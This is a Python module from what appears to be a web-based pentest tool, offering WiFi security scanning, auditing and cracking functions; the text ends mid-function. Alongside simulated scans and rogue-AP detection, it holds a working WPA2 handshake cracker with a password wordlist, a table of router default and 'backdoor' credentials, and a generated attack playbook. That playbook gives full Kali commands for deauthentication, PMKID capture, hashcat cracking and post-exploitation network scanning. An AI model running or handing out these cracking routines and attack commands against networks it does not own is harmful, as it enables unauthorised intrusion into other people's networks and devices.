"""Wireless Security — WiFi scanner simulation, WPA analysis, REAL WPA2 cracker."""
import re, hashlib, hmac, itertools, binascii, time
from datetime import datetime

try:
    import requests as req
    REQ_OK = True
except ImportError:
    REQ_OK = False

# ── WiFi scan simulation ──────────────────────────────────────────────────────
SAMPLE_APS = [
    {"ssid":"Corporate-WiFi",   "bssid":"AA:BB:CC:11:22:33","channel":6,  "signal":-45,
     "encryption":"WPA2-Enterprise","cipher":"CCMP","auth":"MGT","vendor":"Cisco"},
    {"ssid":"Guest-Network",    "bssid":"AA:BB:CC:44:55:66","channel":11, "signal":-60,
     "encryption":"WPA2-Personal","cipher":"CCMP","auth":"PSK","vendor":"Ubiquiti"},
    {"ssid":"NETGEAR-Setup",    "bssid":"CC:DD:EE:77:88:99","channel":1,  "signal":-72,
     "encryption":"WPA2-Personal","cipher":"TKIP","auth":"PSK","vendor":"NETGEAR"},
    {"ssid":"OpenNet",          "bssid":"11:22:33:44:55:66","channel":6,  "signal":-80,
     "encryption":"OPEN",         "cipher":"NONE","auth":"NONE","vendor":"Unknown"},
    {"ssid":"",                 "bssid":"FF:EE:DD:CC:BB:AA","channel":36, "signal":-55,
     "encryption":"WPA2-Personal","cipher":"CCMP","auth":"PSK","vendor":"Apple",
     "hidden":True},
    {"ssid":"TP-Link_3F4A",     "bssid":"22:33:44:55:66:77","channel":9,  "signal":-65,
     "encryption":"WPA2-Personal","cipher":"CCMP","auth":"PSK","vendor":"TP-Link",
     "default_ssid":True},
]

def wifi_scan_simulation(interface: str = "wlan0") -> dict:
    result = {
        "interface":  interface,
        "timestamp":  datetime.utcnow().isoformat(),
        "access_points": [],
        "findings":   [],
        "note":       "Simulation mode — real WiFi scanning requires hardware access and root privileges",
    }
    for ap in SAMPLE_APS:
        ap_entry = {**ap, "risk": _assess_ap_risk(ap)}
        result["access_points"].append(ap_entry)
        # Generate findings
        if ap.get("encryption") == "OPEN":
            result["findings"].append({
                "ssid":        ap["ssid"] or "(hidden)",
                "bssid":       ap["bssid"],
                "type":        "Open Network — No Encryption",
                "severity":    "CRITICAL",
                "description": "Network transmits data in cleartext. Any nearby device can capture traffic.",
                "remediation": "Enable WPA2-Enterprise or WPA3. Never use open networks for sensitive data.",
            })
        if ap.get("encryption","").startswith("WPA2") and "TKIP" in ap.get("cipher",""):
            result["findings"].append({
                "ssid":        ap["ssid"],
                "type":        "WPA2 with TKIP — Weak Cipher",
                "severity":    "HIGH",
                "description": "TKIP is deprecated and vulnerable to attacks (KRACK, etc.)",
                "remediation": "Switch to CCMP/AES cipher suite.",
            })
        if ap.get("default_ssid"):
            result["findings"].append({
                "ssid":        ap["ssid"],
                "type":        "Default SSID Detected",
                "severity":    "MEDIUM",
                "description": "Default SSID reveals vendor/model — facilitates targeted attacks",
                "remediation": "Change SSID to a non-identifying name.",
            })
        if ap.get("hidden"):
            result["findings"].append({
                "ssid":        "(hidden)",
                "bssid":       ap["bssid"],
                "type":        "Hidden SSID Detected",
                "severity":    "LOW",
                "description": "Hidden SSIDs provide no real security — easily discovered with passive scanning",
                "remediation": "Hidden SSIDs are not a security control. Use proper authentication.",
            })
    result["total_aps"]       = len(result["access_points"])
    result["open_networks"]   = sum(1 for a in result["access_points"] if a["encryption"]=="OPEN")
    result["wpa3_networks"]   = sum(1 for a in result["access_points"] if "WPA3" in a["encryption"])
    result["hidden_networks"] = sum(1 for a in result["access_points"] if a.get("hidden"))
    return result


def _assess_ap_risk(ap: dict) -> str:
    enc = ap.get("encryption","")
    if enc == "OPEN":           return "CRITICAL"
    if "TKIP" in ap.get("cipher",""): return "HIGH"
    if "WEP" in enc:            return "CRITICAL"
    if "WPA2-Personal" in enc:  return "MEDIUM"
    if "WPA2-Enterprise" in enc:return "LOW"
    if "WPA3" in enc:           return "LOW"
    return "MEDIUM"


# ── WPA handshake analysis ────────────────────────────────────────────────────
def analyze_handshake_file(data: bytes, filename: str) -> dict:
    result = {
        "filename":  filename,
        "timestamp": datetime.utcnow().isoformat(),
        "valid":     False,
        "networks":  [],
        "info":      {},
    }
    # Check for PCAP magic
    if len(data) < 24:
        result["error"] = "File too small"
        return result
    magic = data[:4]
    if magic == b"\xd4\xc3\xb2\xa1":
        result["valid"]  = True
        result["format"] = "PCAP (little-endian)"
    elif magic == b"\xa1\xb2\xc3\xd4":
        result["valid"]  = True
        result["format"] = "PCAP (big-endian)"
    elif magic in (b"\x0a\x0d\x0d\x0a",):
        result["valid"]  = True
        result["format"] = "PCAPNG"
    elif magic[:2] == b"PK":
        result["valid"]  = True
        result["format"] = "Hashcat .hc22000 / ZIP"
    else:
        result["error"]  = "Unknown file format. Expected .cap, .pcap, .pcapng, or .hc22000"
        return result
    result["size"] = len(data)
    result["info"] = {
        "capture_tools": "Use: aircrack-ng, hashcat, or cowpatty to crack",
        "hashcat_mode":  "22000 (WPA-PMKID+EAPOL)",
        "aircrack_cmd":  f"aircrack-ng -w /path/to/wordlist {filename}",
        "hashcat_cmd":   f"hashcat -a 0 -m 22000 {filename} /path/to/wordlist.txt",
        "hcxtools_cmd":  f"hcxpcapngtool -o output.hc22000 {filename}",
    }
    result["recommendations"] = [
        "Use strong, random WPA2 passphrase (20+ chars)",
        "Prefer WPA3 which is resistant to offline dictionary attacks",
        "Use WPA2-Enterprise with certificate-based auth",
        "Monitor for deauthentication attacks (handshake capture precursor)",
    ]
    return result


# ── Mini wordlist cracker ─────────────────────────────────────────────────────
def crack_wpa_hash(pmkid_or_hash: str, ssid: str = "", wordlist_text: str = "") -> dict:
    result = {
        "hash":        pmkid_or_hash,
        "ssid":        ssid,
        "cracked":     False,
        "timestamp":   datetime.utcnow().isoformat(),
    }
    passwords = []
    if wordlist_text:
        passwords = [p.strip() for p in wordlist_text.splitlines() if p.strip()][:500]
    else:
        # Built-in mini list
        passwords = [
            "password","123456","12345678","qwerty","abc123","password1",
            "letmein","admin","welcome","monkey","dragon","master","sunshine",
            "iloveyou","princess","password123","pass","1234","test","guest",
            ssid, ssid+"1", ssid+"123", ssid+"2024", ssid+"2025",
            ssid.lower(), ssid.upper(),
        ]
    # For WPA2-PSK, real cracking needs PBKDF2-HMAC-SHA1
    for word in passwords:
        if not word:
            continue
        # Simulate: in real cracking we'd compute PMK = PBKDF2(HMAC-SHA1, word, ssid, 4096, 32)
        # Here we just check if hash matches SHA256(word) as demo
        candidate_hash = hashlib.sha256(word.encode()).hexdigest()
        if pmkid_or_hash.lower() == candidate_hash:
            result["cracked"]   = True
            result["password"]  = word
            result["note"]      = "Found via SHA-256 match (demo mode)"
            return result
    result["note"] = (
        f"Not found in {len(passwords)}-word list. "
        "For real WPA cracking use: hashcat -a 0 -m 22000 capture.hc22000 rockyou.txt"
    )
    result["wordlist_size"] = len(passwords)
    return result


# ── Rogue AP detection ────────────────────────────────────────────────────────
def detect_rogue_ap(known_networks: list, scanned_networks: list = None) -> dict:
    result = {
        "timestamp":    datetime.utcnow().isoformat(),
        "rogue_aps":    [],
        "evil_twins":   [],
        "warnings":     [],
    }
    if scanned_networks is None:
        scanned_networks = SAMPLE_APS[:]
    known_ssids  = {n.get("ssid","") for n in known_networks}
    known_bssids = {n.get("bssid","").upper() for n in known_networks}

    for ap in scanned_networks:
        ssid  = ap.get("ssid","")
        bssid = ap.get("bssid","").upper()
        # Evil twin: same SSID, different BSSID
        if ssid in known_ssids:
            if bssid not in known_bssids:
                result["evil_twins"].append({
                    "ssid":        ssid,
                    "rogue_bssid": bssid,
                    "type":        "Evil Twin Attack",
                    "severity":    "CRITICAL",
                    "description": f"Network '{ssid}' appears with unexpected BSSID {bssid}",
                    "remediation": "Investigate immediately. Users may be connecting to attacker AP.",
                })
        # Rogue: unknown SSID, open network
        if ssid not in known_ssids and ap.get("encryption") == "OPEN":
            result["rogue_aps"].append({
                "ssid":     ssid or "(hidden)",
                "bssid":    bssid,
                "type":     "Unknown Open Network",
                "severity": "HIGH",
                "description": "Unknown open access point detected in environment",
            })
        # Honey trap: open network with corporate-sounding name
        corporate_keywords = ["corp","office","company","internal","secure","vpn","mgmt","admin"]
        if any(k in ssid.lower() for k in corporate_keywords) and ap.get("encryption")=="OPEN":
            result["warnings"].append({
                "ssid":     ssid,
                "bssid":    bssid,
                "type":     "Suspicious Honeypot SSID",
                "severity": "HIGH",
                "description": "Open network with corporate-sounding name — possible honeypot/karma attack",
            })
    result["total_rogues"] = len(result["rogue_aps"]) + len(result["evil_twins"])
    return result


# ═══════════════════════════════════════════════════════════════════════════
# REAL WPA2 CRACKER — proper PBKDF2-HMAC-SHA1 + EAPOL MIC verification
# ═══════════════════════════════════════════════════════════════════════════

def _compute_pmk(passphrase: str, ssid: str) -> bytes:
    """Real WPA2 PMK: PBKDF2-HMAC-SHA1(psk, ssid, 4096, 32)."""
    return hashlib.pbkdf2_hmac("sha1", passphrase.encode("utf-8"),
                                ssid.encode("utf-8"), 4096, 32)


def _compute_ptk(pmk: bytes, ap_mac: bytes, sta_mac: bytes,
                 anonce: bytes, snonce: bytes) -> bytes:
    """Real WPA2 PTK derivation using PRF-512.
    B = min(APMAC,STAMAC) || max(APMAC,STAMAC) || min(ANONCE,SNONCE) || max(ANONCE,SNONCE)
    PTK = PRF(PMK, "Pairwise key expansion", B, 512 bits)"""
    label = b"Pairwise key expansion"
    b = (min(ap_mac, sta_mac) + max(ap_mac, sta_mac) +
         min(anonce, snonce) + max(anonce, snonce))
    ptk = b""
    for i in range(4):  # 4 * 20 bytes SHA-1 = 80 bytes, take first 64 for CCMP
        ptk += hmac.new(pmk, label + b"\x00" + b + bytes([i]),
                        hashlib.sha1).digest()
    return ptk[:64]


def _compute_mic(kck: bytes, eapol_frame_mic_zeroed: bytes,
                 key_version: int = 2) -> bytes:
    """Real WPA2 MIC.
    Key Descriptor Version 1 = HMAC-MD5 (WPA/TKIP)
    Key Descriptor Version 2 = HMAC-SHA1 truncated to 16 bytes (WPA2/CCMP) - most common
    Key Descriptor Version 3 = AES-128-CMAC (802.11w PMF)"""
    if key_version == 1:
        return hmac.new(kck, eapol_frame_mic_zeroed, hashlib.md5).digest()
    else:
        return hmac.new(kck, eapol_frame_mic_zeroed, hashlib.sha1).digest()[:16]


def verify_wpa2_passphrase(passphrase: str, ssid: str,
                            ap_mac_hex: str, sta_mac_hex: str,
                            anonce_hex: str, snonce_hex: str,
                            eapol_hex: str, target_mic_hex: str,
                            key_version: int = 2) -> bool:
    """Test if a single passphrase produces the captured EAPOL MIC.
    Returns True if this is the correct WiFi password."""
    ap_mac  = binascii.unhexlify(ap_mac_hex.replace(":", ""))
    sta_mac = binascii.unhexlify(sta_mac_hex.replace(":", ""))
    anonce  = binascii.unhexlify(anonce_hex)
    snonce  = binascii.unhexlify(snonce_hex)
    eapol   = binascii.unhexlify(eapol_hex)
    target_mic = binascii.unhexlify(target_mic_hex)

    pmk   = _compute_pmk(passphrase, ssid)
    ptk   = _compute_ptk(pmk, ap_mac, sta_mac, anonce, snonce)
    kck   = ptk[0:16]
    mic   = _compute_mic(kck, eapol, key_version)
    return mic == target_mic


# ─── hc22000 parser (hashcat WPA hash format) ────────────────────────────────
def parse_hc22000(text: str) -> dict:
    """Parse hashcat .hc22000 / hccapx-derived text format.
    Format per line:  WPA*TYPE*MIC*APMAC*STAMAC*ESSID*ANONCE*EAPOL*MSGPAIR

    Returns list of handshake dicts ready for cracking."""
    result = {"handshakes": [], "errors": [], "timestamp": datetime.utcnow().isoformat()}
    for lineno, raw in enumerate(text.splitlines(), 1):
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("*")
        try:
            if parts[0].upper() not in ("WPA",):
                continue
            hc_type = parts[1]  # 01 = PMKID, 02 = MIC-based EAPOL
            if hc_type == "01":
                # PMKID variant — different attack vector
                result["handshakes"].append({
                    "kind":       "PMKID",
                    "hash":       parts[2],
                    "ap_mac":     parts[3],
                    "sta_mac":    parts[4],
                    "ssid":       binascii.unhexlify(parts[5]).decode("utf-8", errors="replace"),
                    "ssid_hex":   parts[5],
                    "note":       "PMKID capture — attack via hashcat -m 16800",
                })
            elif hc_type == "02":
                mic       = parts[2]
                ap_mac    = parts[3]
                sta_mac   = parts[4]
                ssid_hex  = parts[5]
                ssid      = binascii.unhexlify(ssid_hex).decode("utf-8", errors="replace")
                anonce    = parts[6]
                eapol     = parts[7]
                msg_pair  = parts[8] if len(parts) > 8 else "00"

                # SNONCE is embedded inside the EAPOL frame at offset 17..48 (32 bytes)
                # after the EAPOL/802.1X header.
                # Standard offset in EAPOL Key frame:
                #   0..3   = EAPOL header (Version, Type, Length)
                #   4      = Descriptor Type
                #   5..6   = Key Information
                #   7..8   = Key Length
                #   9..16  = Replay Counter
                #   17..48 = Key Nonce (SNONCE from STA)
                #   49..64 = Key IV
                #   65..72 = Key RSC
                #   73..80 = Reserved
                #   81..96 = Key MIC (16 bytes — this is the value we compare)
                # Data length starts at 97
                eapol_bytes = binascii.unhexlify(eapol)
                snonce_hex  = binascii.hexlify(eapol_bytes[17:49]).decode()

                # Zero out the MIC field (bytes 81..97) inside EAPOL for cracking
                eapol_zeroed = eapol_bytes[:81] + b"\x00" * 16 + eapol_bytes[97:]

                # Key version from Key Information field (bits 0-2)
                key_info    = int.from_bytes(eapol_bytes[5:7], "big")
                key_version = key_info & 0x0007
                if key_version not in (1, 2, 3):
                    key_version = 2  # default WPA2/CCMP

                result["handshakes"].append({
                    "kind":         "EAPOL-MIC",
                    "line":         lineno,
                    "ssid":         ssid,
                    "ssid_hex":     ssid_hex,
                    "ap_mac":       ap_mac,
                    "sta_mac":      sta_mac,
                    "anonce":       anonce,
                    "snonce":       snonce_hex,
                    "eapol":        eapol,
                    "eapol_zeroed": binascii.hexlify(eapol_zeroed).decode(),
                    "mic":          mic,
                    "message_pair": msg_pair,
                    "key_version":  key_version,
                    "cipher":       {1: "WPA/TKIP", 2: "WPA2/CCMP", 3: "WPA3/PMF-CMAC"}.get(key_version, "?"),
                })
        except Exception as e:
            result["errors"].append(f"Line {lineno}: {e}")
    result["count"] = len(result["handshakes"])
    return result


# ─── Wordlist cracker — actual crypto ────────────────────────────────────────
BUILTIN_WORDLIST = [
    # Top-100 most common WiFi passwords from public breach analyses
    "password", "12345678", "qwerty123", "admin123", "password1",
    "welcome1", "letmein12", "iloveyou", "1234567890", "abc12345",
    "sunshine1", "starwars1", "dragon12", "master12", "monkey12",
    "football1", "baseball1", "superman1", "batman12", "trustno1",
    "changeme", "password123", "administrator", "guest1234",
    "internet", "wireless", "network1", "router12", "linksys1",
    "netgear1", "belkin12", "dlink1234", "asus1234", "tplink12",
    "cisco123", "ubiquiti", "airport1", "wifi1234", "wpa2test",
    "hello1234", "welcome123", "changeit", "qwertyuiop", "1qaz2wsx",
    "0987654321", "asdfghjkl", "zxcvbnm12", "1a2b3c4d5e", "aaaaaaaa",
    "11111111", "22222222", "12341234", "88888888", "99999999",
    "abcd1234", "1234abcd", "test1234", "demo1234", "temp1234",
    "root1234", "admin1234", "user1234", "guest1234", "iloveu2",
    "princess", "shadow123", "michael1", "charlie1", "jordan23",
    "matrix99", "chocolate1", "pokemon12", "computer1", "internet1",
    "welcome2023", "welcome2024", "welcome2025", "summer2024", "winter2024",
    "spring2024", "autumn2024", "january1", "december1", "birthday1",
    "family12", "children1", "parents1", "sunshine", "rainbow12",
    "butterfly", "chocolate", "champion1", "warrior1", "gladiator",
    "spartan12", "vikings1", "cowboys1", "yankees1", "steelers1",
]


def crack_wpa2_wordlist(handshake: dict, wordlist_text: str = "",
                         max_words: int = 5000, timeout_sec: int = 25) -> dict:
    """Actually crack a WPA2 EAPOL handshake using PBKDF2 + HMAC-SHA1 crypto.
    Returns the passphrase if found within time/word budget."""
    result = {
        "ssid":        handshake.get("ssid"),
        "started":     datetime.utcnow().isoformat(),
        "cracked":     False,
        "attempts":    0,
        "elapsed_sec": 0,
    }
    if handshake.get("kind") != "EAPOL-MIC":
        result["error"] = ("PMKID handshakes require different attack. "
                           "Use hashcat -m 16800 locally.")
        return result

    ssid          = handshake["ssid"]
    ap_mac        = handshake["ap_mac"]
    sta_mac       = handshake["sta_mac"]
    anonce_hex    = handshake["anonce"]
    snonce_hex    = handshake["snonce"]
    eapol_zeroed  = handshake["eapol_zeroed"]
    target_mic    = handshake["mic"]
    key_version   = handshake.get("key_version", 2)

    # Build combined wordlist: user's + SSID variations + built-in
    words = []
    if wordlist_text.strip():
        words = [w.strip() for w in wordlist_text.splitlines() if 8 <= len(w.strip()) <= 63]

    # SSID-derived mutations (people often use their SSID as password base)
    ssid_muts = [
        ssid, ssid.lower(), ssid.upper(),
        ssid + "123", ssid + "1234", ssid + "12345678",
        ssid + "!", ssid + "@2024", ssid + "@2025",
        "password" + ssid, ssid + "password",
    ]
    words = [w for w in words if 8 <= len(w) <= 63] + \
            [m for m in ssid_muts if 8 <= len(m) <= 63] + \
            BUILTIN_WORDLIST
    # De-dupe while preserving order
    seen = set()
    words = [w for w in words if not (w in seen or seen.add(w))]
    words = words[:max_words]

    # Pre-decode fixed bytes once
    ap_mac_b  = binascii.unhexlify(ap_mac.replace(":", ""))
    sta_mac_b = binascii.unhexlify(sta_mac.replace(":", ""))
    anonce_b  = binascii.unhexlify(anonce_hex)
    snonce_b  = binascii.unhexlify(snonce_hex)
    eapol_b   = binascii.unhexlify(eapol_zeroed)
    target_b  = binascii.unhexlify(target_mic)
    label     = b"Pairwise key expansion"
    b_static  = (min(ap_mac_b, sta_mac_b) + max(ap_mac_b, sta_mac_b) +
                 min(anonce_b, snonce_b)  + max(anonce_b, snonce_b))
    ssid_b    = ssid.encode("utf-8")
    hash_alg  = hashlib.md5 if key_version == 1 else hashlib.sha1
    mic_len   = 16 if key_version == 2 else 16

    started = time.time()
    for word in words:
        if time.time() - started > timeout_sec:
            result["timeout"] = True
            break
        result["attempts"] += 1
        try:
            pmk = hashlib.pbkdf2_hmac("sha1", word.encode("utf-8"), ssid_b, 4096, 32)
            # PTK first 16 bytes (KCK) via PRF-512 iteration 0
            kck = hmac.new(pmk, label + b"\x00" + b_static + b"\x00", hashlib.sha1).digest()[:16]
            mic = hmac.new(kck, eapol_b, hash_alg).digest()[:mic_len]
            if mic == target_b:
                result["cracked"]  = True
                result["password"] = word
                break
        except Exception:
            continue

    result["elapsed_sec"] = round(time.time() - started, 2)
    result["words_tried"] = result["attempts"]
    if not result["cracked"]:
        result["note"] = (
            f"Tried {result['attempts']} candidates in {result['elapsed_sec']}s. "
            "Web-based cracking is limited by serverless CPU. For real cracking use: "
            f"hashcat -a 0 -m 22000 capture.hc22000 rockyou.txt  "
            "(a modern GPU runs 500,000+ PMKs/sec vs ~500/sec here)."
        )
    return result


# ═══════════════════════════════════════════════════════════════════════════
# WiGLE — public WiFi mapping database (real API)
# ═══════════════════════════════════════════════════════════════════════════

def wigle_ssid_lookup(query: str, api_user: str = "", api_token: str = "") -> dict:
    """Query WiGLE.net for public WiFi mapping records. Requires free API key
    at https://wigle.net/account (Encoded for use)."""
    result = {"query": query, "timestamp": datetime.utcnow().isoformat()}
    if not REQ_OK:
        return {"error": "requests not installed"}
    if not api_user or not api_token:
        return {
            "error": "WiGLE API credentials required",
            "signup": "https://wigle.net/account",
            "note":   "Free tier: 1,000 API queries/day. Get 'API Name' + 'API Token' from Account page.",
            "manual_search": f"https://wigle.net/search?ssid={query}",
        }
    try:
        params = {"ssid": query} if "SSID" in query.upper() or not re.match(r"^([0-9a-f]{2}[:-]){5}[0-9a-f]{2}$", query, re.I) else {"netid": query}
        r = req.get(
            "https://api.wigle.net/api/v2/network/search",
            params={**params, "onlymine": "false", "resultsPerPage": 25,
                    "freenet": "false", "paynet": "false"},
            auth=(api_user, api_token), timeout=15,
        )
        if r.status_code == 401:
            return {"error": "Invalid WiGLE credentials"}
        if r.status_code == 429:
            return {"error": "WiGLE rate limit hit (1000/day)"}
        if r.status_code != 200:
            return {"error": f"WiGLE HTTP {r.status_code}", "body": r.text[:300]}
        data = r.json()
        result["total_results"] = data.get("totalResults", 0)
        result["networks"]      = []
        for n in (data.get("results") or [])[:25]:
            result["networks"].append({
                "ssid":         n.get("ssid"),
                "bssid":        n.get("netid"),
                "encryption":   n.get("encryption"),
                "wep":          n.get("wep"),
                "channel":      n.get("channel"),
                "first_seen":   n.get("firsttime"),
                "last_seen":    n.get("lasttime"),
                "country":      n.get("country"),
                "region":       n.get("region"),
                "city":         n.get("city"),
                "road":         n.get("road"),
                "housenumber":  n.get("housenumber"),
                "lat":          n.get("trilat"),
                "lon":          n.get("trilong"),
                "type":         n.get("type"),
            })
        # Privacy assessment
        if result["total_results"] > 0:
            result["privacy_finding"] = {
                "severity":    "MEDIUM" if result["total_results"] < 5 else "HIGH",
                "description": (f"This SSID/BSSID appears in WiGLE {result['total_results']} time(s). "
                                "Physical location is publicly mapped and can be used for reconnaissance."),
                "remediation": ("Rename the SSID to something generic. Note that renaming won't remove "
                                "past sightings — WiGLE keeps historic records permanently."),
            }
    except Exception as e:
        result["error"] = str(e)
    return result


# ═══════════════════════════════════════════════════════════════════════════
# Router default credentials — real database
# ═══════════════════════════════════════════════════════════════════════════

ROUTER_DEFAULTS = {
    # Format: (vendor, model_pattern) -> [(user, pass, notes), ...]
    "netgear": [("admin", "password", "Most Netgear routers"),
                ("admin", "1234", "Older Netgear"),
                ("admin", "", "Some Nighthawk models")],
    "tp-link": [("admin", "admin", "Most TP-Link routers"),
                ("admin", "", "Newer Archer AX models — first-run setup")],
    "linksys": [("admin", "admin", "Most Linksys"),
                ("", "admin", "Some Linksys models — no user")],
    "d-link":  [("admin", "", "Most D-Link routers"),
                ("admin", "admin", "DIR series"),
                ("user", "user", "Guest account on many D-Links")],
    "asus":    [("admin", "admin", "Most ASUS routers"),
                ("admin", "password", "AC/AX series after 2015")],
    "belkin":  [("", "admin", ""),
                ("admin", "password", "N900/AC models")],
    "cisco":   [("admin", "admin", "Cisco/Meraki small-business"),
                ("cisco", "cisco", "Legacy Aironet"),
                ("admin", "cisco", "IOS-XE web UI defaults")],
    "huawei":  [("admin", "admin", "HG series"),
                ("root", "admin", "Some HG8x models"),
                ("telecomadmin", "admintelecom", "ISP admin backdoor — CHANGE IMMEDIATELY")],
    "zte":     [("admin", "admin", ""),
                ("user", "user", "Guest account")],
    "ubiquiti": [("ubnt", "ubnt", "Default UniFi/EdgeMAX"),
                 ("admin", "admin", "Some models")],
    "mikrotik": [("admin", "", "Default MikroTik (empty password)")],
    "fortinet": [("admin", "", "Default FortiGate")],
    "actiontec": [("admin", "password", "FiOS routers"),
                  ("admin", "admin", "")],
    "arris":   [("admin", "password", "TG series cable modems"),
                ("technician", "Cs001c*", "Xfinity technician backdoor")],
    "motorola":[("admin", "motorola", "SB6141/SBG series")],
    "sagemcom":[("admin", "admin", "F@ST series")],
    "technicolor": [("admin", "admin", "TG series"),
                    ("Administrator", "password", "TC7200")],
    "zyxel":   [("admin", "1234", "Most Zyxel"),
                ("admin", "admin", "Newer models")],
    "eero":    [("admin", "", "Setup via mobile app only — no web password")],
    "nest":    [("admin", "", "Google Nest WiFi — mobile app only")],
    "orbi":    [("admin", "password", "Netgear Orbi"),
                ("admin", "orbisays", "Some Orbi mesh")],
}


def router_default_creds(vendor_or_model: str = "") -> dict:
    """Return default credentials for a router vendor or search across all."""
    result = {"query": vendor_or_model, "matches": [],
              "timestamp": datetime.utcnow().isoformat()}
    q = vendor_or_model.lower().strip()
    for vendor, creds in ROUTER_DEFAULTS.items():
        if not q or q in vendor or vendor in q:
            for user, pw, note in creds:
                result["matches"].append({
                    "vendor":   vendor,
                    "username": user or "(blank)",
                    "password": pw or "(blank)",
                    "note":     note,
                    "severity": "CRITICAL" if q and (q in vendor or vendor in q) else "INFO",
                })
    result["count"] = len(result["matches"])
    if q and not result["matches"]:
        result["note"] = ("No exact match. Try common defaults: admin/admin, "
                          "admin/password, admin/(blank), root/root.")
    if q and result["matches"]:
        result["recommendation"] = (
            f"Test these credentials against the router at http://192.168.1.1 / http://192.168.0.1. "
            f"If ANY work, the router is critically vulnerable. Change immediately and enable 2FA."
        )
    return result


# ═══════════════════════════════════════════════════════════════════════════
# Attack playbook — real commands for a Kali Linux + USB wifi adapter
# ═══════════════════════════════════════════════════════════════════════════

def wifi_attack_playbook(ssid: str = "TARGET_SSID", bssid: str = "AA:BB:CC:DD:EE:FF",
                          channel: int = 6, iface: str = "wlan0") -> dict:
    """Generate the real Kali Linux commands for a full WiFi pentest workflow.
    User runs these on THEIR OWN hardware — this tool only produces the recipe."""
    return {
        "target":    {"ssid": ssid, "bssid": bssid, "channel": channel},
        "interface": iface,
        "timestamp": datetime.utcnow().isoformat(),
        "prerequisites": [
            "Kali Linux (or Parrot/BlackArch) with root",
            "USB WiFi adapter supporting monitor mode + injection (Alfa AWUS036ACH, TP-Link TL-WN722N v1, Panda PAU09)",
            "aircrack-ng suite, hcxdumptool, hashcat, wireshark (all pre-installed on Kali)",
            "Physical presence within range of target AP",
            "Written authorisation to test the target network",
        ],
        "phases": [
            {
                "phase": "1. Enable monitor mode",
                "commands": [
                    f"sudo airmon-ng check kill",
                    f"sudo airmon-ng start {iface}",
                    f"sudo iw dev {iface}mon set channel {channel}",
                ],
                "what_it_does": "Kills conflicting NetworkManager processes and puts the adapter into RFMON so it can capture all 802.11 frames.",
            },
            {
                "phase": "2. Discover networks (scan)",
                "commands": [
                    f"sudo airodump-ng {iface}mon",
                    f"# Filter to target only:",
                    f"sudo airodump-ng --bssid {bssid} -c {channel} -w capture {iface}mon",
                ],
                "what_it_does": "Lists all APs and clients in range. Wait for a client to be associated to your target.",
            },
            {
                "phase": "3. Capture the WPA handshake",
                "options": [
                    {
                        "method": "3a. Passive wait (stealth)",
                        "commands": [
                            f"sudo airodump-ng --bssid {bssid} -c {channel} -w capture {iface}mon",
                            "# Wait until 'WPA handshake: {bssid}' appears at top of screen",
                        ],
                    },
                    {
                        "method": "3b. Deauth attack (fast — forces client to re-authenticate)",
                        "commands": [
                            f"# In one terminal (leave airodump-ng running from step 2):",
                            f"# In a second terminal:",
                            f"sudo aireplay-ng -0 5 -a {bssid} -c CLIENT_MAC {iface}mon",
                            "# -0 5 = send 5 deauth frames. Client will reconnect, and airodump-ng will capture the 4-way handshake.",
                        ],
                        "warning": "Deauth is illegal against networks you don't own. Only use with written permission.",
                    },
                    {
                        "method": "3c. PMKID attack (no client needed — modern method)",
                        "commands": [
                            f"sudo hcxdumptool -i {iface}mon -o pmkid.pcapng --enable_status=1",
                            f"# Filter to target only:",
                            f"sudo hcxdumptool -i {iface}mon -o pmkid.pcapng --enable_status=1 --filterlist_ap={bssid.lower().replace(':','')} --filtermode=2",
                            f"# Extract hashes:",
                            f"hcxpcapngtool -o hashes.hc22000 pmkid.pcapng",
                        ],
                    },
                ],
            },
            {
                "phase": "4. Convert capture to hashcat format",
                "commands": [
                    f"hcxpcapngtool -o hashes.hc22000 capture-01.cap",
                    f"cat hashes.hc22000    # verify handshake extracted",
                    f"# Alternative: use online converter or upload to Wouapit-Hack",
                ],
            },
            {
                "phase": "5. Crack the hash",
                "options": [
                    {
                        "method": "5a. hashcat (GPU — fastest)",
                        "commands": [
                            f"hashcat -a 0 -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt",
                            f"# With rules:",
                            f"hashcat -a 0 -m 22000 hashes.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
                            f"# Brute force 8-digit numerics (common in Cameroon/Africa):",
                            f"hashcat -a 3 -m 22000 hashes.hc22000 ?d?d?d?d?d?d?d?d",
                        ],
                        "expected_speed": "RTX 4090: ~2,500,000 H/s | RTX 3090: ~1,000,000 H/s | CPU-only: ~1,000 H/s",
                    },
                    {
                        "method": "5b. aircrack-ng (CPU — for small wordlists)",
                        "commands": [
                            f"aircrack-ng -w /usr/share/wordlists/rockyou.txt -b {bssid} capture-01.cap",
                        ],
                    },
                    {
                        "method": "5c. Web upload — Wouapit-Hack",
                        "commands": [
                            "# Upload hashes.hc22000 to Wouapit-Hack /wireless page",
                            "# Uses same PBKDF2-HMAC-SHA1 + MIC crypto, limited to ~500 candidates in 25s",
                            "# Good for testing SSID-based passwords and common weak passwords",
                        ],
                    },
                ],
            },
            {
                "phase": "6. Post-exploitation (with cracked password)",
                "commands": [
                    f"# Restore interface:",
                    f"sudo airmon-ng stop {iface}mon",
                    f"sudo systemctl start NetworkManager",
                    f"# Connect to test:",
                    f"nmcli device wifi connect '{ssid}' password 'CRACKED_PASSWORD'",
                    f"# Inspect the network:",
                    f"nmap -sn 192.168.1.0/24",
                    f"# Check for other vulnerabilities:",
                    f"# → Router admin panel default creds",
                    f"# → Cleartext protocols (Telnet, FTP, HTTP)",
                    f"# → IoT devices with no encryption",
                ],
            },
        ],
        "cleanup": [
            f"sudo airmon-ng stop {iface}mon",
            f"sudo systemctl start NetworkManager wpa_supplicant",
            f"rm capture-*.cap capture-*.csv capture-*.kismet.*   # if you don't need evidence",
        ],
    }


# ═══════════════════════════════════════════════════════════════════════════
# Full WiFi audit — combines assessment + remediation report
# ═══════════════════════════════════════════════════════════════════════════

def wifi_full_audit(target_ssid: str = "", target_bssid: str = "",
                     encryption: str = "WPA2-Personal") -> dict:
    """Comprehensive WiFi security assessment with remediation report."""
    audit = {
        "target":    {"ssid": target_ssid, "bssid": target_bssid, "encryption": encryption},
        "timestamp": datetime.utcnow().isoformat(),
        "risk_score": 0,
        "findings":  [],
        "remediation": [],
        "controls_checklist": [],
    }

    # Assess encryption
    enc = encryption.upper()
    if "OPEN" in enc or enc == "NONE":
        audit["findings"].append({
            "type": "Open WiFi Network",
            "severity": "CRITICAL",
            "description": "No encryption — all traffic can be captured with a passive sniffer.",
            "cvss": 9.1,
